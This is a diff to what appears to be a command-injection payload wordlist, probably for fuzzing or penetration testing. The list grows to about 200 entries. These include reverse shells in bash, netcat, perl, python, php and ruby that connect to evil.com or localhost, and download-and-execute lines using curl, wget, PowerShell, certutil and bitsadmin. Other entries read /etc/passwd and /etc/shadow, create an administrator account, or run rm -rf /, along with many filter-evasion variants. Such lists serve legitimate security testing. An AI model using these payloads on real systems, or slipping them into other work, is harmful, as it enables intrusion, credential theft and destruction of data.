@@ -1,22 +1,207 @@
-;cat /etc/passwd
-| ls -la
-&&whoami
+$(cat /etc/passwd)
+$(cat /etc/shadow)
+$(cat${IFS}/etc/passwd)
 $(id)
-`whoami`
-;shutdown -h now
+$(ifconfig)
+$(ls -la)
+$(sleep 5)
+$(uname -a)
+$(whoami)
+$IFS$IFS/???/??t$IFS$IFS/???/?????d
+${IFS}cat${IFS}/etc/passwd
+${IFS}whoami
 %0acat /etc/passwd
-x%0Aid
-&dir
-|nc attacker.com 4444
-curl http://evil.com/sh|sh
-wget -qO- http://x.s/h|bash
-;rm -rf /
 & ping -c 5 attacker.com
-; base64 -d cGF5bG9hZA==|sh
-printf \x2d\x65|sh
-xxd -r /tmp/x|sh
+& whoami
+&&bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+&&cat /etc/passwd
+&&cat /etc/shadow
+&&cat${IFS}/etc/passwd
+&&id
+&&ifconfig
+&&ls -la
+&&nc -e /bin/sh 127.0.0.1 4444
+&&sh -i >& /dev/tcp/127.0.0.1/4444 0>&1
+&&sleep 5
+&&uname -a
+&&whoami
+&cat /etc/passwd
+&dir
+&id
+&ifconfig
+&ls -la
+&net user
+&uname -a
+&whoami
+/???/??t /???/?????d
+/???/??t /???/??ss??
+/???/??t /???/p??s??
+/\b\i\n/////s\h
+/\b\i\n/////s\h -c id
 /bin/bash -c /dev/tcp/attacker.com/4444
-powershell -c IEX(New-Object Net.WebClient).DownloadString('http://x/p')
+127.0.0.1 & whoami
+127.0.0.1 && whoami
+127.0.0.1 | whoami
+127.0.0.1 || whoami
+127.0.0.1$(cat /etc/passwd)
+127.0.0.1$(id)
+127.0.0.1$(ls -la)
+127.0.0.1$(uname -a)
+127.0.0.1$(whoami)
+127.0.0.1&&cat /etc/passwd
+127.0.0.1&&id
+127.0.0.1&&ls -la
+127.0.0.1&&ping -c 10 127.0.0.1
+127.0.0.1&&sleep 10
+127.0.0.1&&uname -a
+127.0.0.1&&whoami
+127.0.0.1&cat /etc/passwd
+127.0.0.1&id
+127.0.0.1&whoami
+127.0.0.1; whoami
+127.0.0.1;cat /etc/passwd
+127.0.0.1;id
+127.0.0.1;ls -la
+127.0.0.1;ping -c 10 127.0.0.1
+127.0.0.1;sleep 10
+127.0.0.1;uname -a
+127.0.0.1;whoami
+127.0.0.1`cat /etc/passwd`
+127.0.0.1`id`
+127.0.0.1`ls -la`
+127.0.0.1`uname -a`
+127.0.0.1`whoami`
+127.0.0.1|cat /etc/passwd
+127.0.0.1|id
+127.0.0.1|ls -la
+127.0.0.1|ping -c 10 127.0.0.1
+127.0.0.1|sleep 10
+127.0.0.1|uname -a
+127.0.0.1|whoami
 ; /bin/cat /etc/shadow
+; base64 -d cGF5bG9hZA==|sh
+;${IFS}sleep${IFS}9
+;/bin/sh
+;bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+;bitsadmin /transfer job http://evil.com/x.exe x.exe
+;cat /etc/passwd
+;cat /etc/shadow
+;cat${IFS}/etc/passwd
+;certutil -urlcache -split -f http://evil.com/x.exe x.exe
+;id
+;ifconfig
+;ls -la
+;ls$IFS-al
+;nc -e /bin/sh 127.0.0.1 4444
+;net localgroup administrators hacker /add
+;net user hacker pass123 /add
+;netcat 127.0.0.1 4444 -e /bin/sh
+;nslookup evil.com
+;perl -e 'use Socket;socket(S,2,1,0);connect(S,sockaddr_in(4444,inet_aton("evil.com")));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh")'
+;php -r '$sock=fsockopen("evil.com",4444);exec("/bin/sh -i <&3 >&3 2>&3")'
+;ping -c 1 evil.com
+;ping -c 5 127.0.0.1
+;python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("evil.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+;rm -rf /
+;ruby -rsocket -e 'f=TCPSocket.open("evil.com",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+;sh -i >& /dev/tcp/127.0.0.1/4444 0>&1
+;shutdown -h now
+;sleep 5
+;sleep 9
+;sleep${IFS}9
+;uname -a
+;whoami
+X=$'uname\x20-a'&&$X
+`cat /etc/passwd`
+`cat /etc/shadow`
+`cat${IFS}/etc/passwd`
+`id`
+`ifconfig`
+`ls -la`
+`sleep 5`
+`uname -a`
+`whoami`
+abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'
+bitsadmin /transfer job http://127.0.0.1/ file
+c/pa\
+cat ${HOME:0:1}etc${HOME:0:1}passwd
+cat /???/?????d
+cat /???/??ss??
+cat /et\
+cat$IFS/et$IFSc/pas$IFSswd
+cat$IFS/etc/passwd
+cat${IFS}/???/?????d
+cat%20/et%5C%0Ac/pa%5C%0Asswd
+cat</etc/passwd
+certutil -urlcache -split -f http://127.0.0.1/ file
+curl http://evil.com/sh|sh
+dir C:\Windows\win.ini
+echo ${HOME:0:1}etc${HOME:0:1}passwd
+echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
+echo ~+
+echo ~-
+echo$IFS"test"
+echo${IFS}$'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'
 find / -name *.txt;cat /etc/passwd
+ls$IFS-la
+nohup sleep 120 > /dev/null &
+powershell -c "whoami"
+powershell -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')
+powershell -c IEX(New-Object Net.WebClient).DownloadString('http://x/p')
+printf \x2d\x65|sh
+sswd
+type C:\Windows\win.ini
+w"h"o"am"i
+w'h'o'am'i
+w\ho\am\i
+wget -qO- http://x.s/h|bash
+wh''oami
+wh``oami
+who$()ami
+who$(echo am)i
+who$@ami
+who`echo am`i
+whoami${IFS}&&${IFS}id
+x%0Aid
+xxd -r -p <<< 2f6574632f706173737764
+xxd -r /tmp/x|sh
+{,$"whoami",}
+{,/?s?/?i?/c?t,/e??/p??s??,}
+{,echo,}
+{,ifconfig,eth0}
+{,ifconfig}
+{,ip,a}
+{cat,/etc/passwd}
+{ifconfig,eth0}
+{ifconfig}
+{l,-lh}s
+{ls,-la}
+| ls -la
 | wget http://evil.com/x.sh;chmod +x x.sh
+|/bin/sh
+|bash -i
+|bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
+|cat /etc/passwd
+|cat /etc/shadow
+|cat${IFS}/etc/passwd
+|id
+|ifconfig
+|ls -la
+|nc -e /bin/sh 127.0.0.1 4444
+|nc 127.0.0.1 4444 -e /bin/sh
+|nc attacker.com 4444
+|net user hacker pass123 /add
+|nslookup evil.com
+|ping -c 10 127.0.0.1
+|ping evil.com
+|sh -i >& /dev/tcp/127.0.0.1/4444 0>&1
+|sleep 5
+|uname -a
+|whoami
+||cat /etc/passwd
+||id
+||ifconfig
+||ls -la
+||sleep 5
+||uname -a
+||whoami
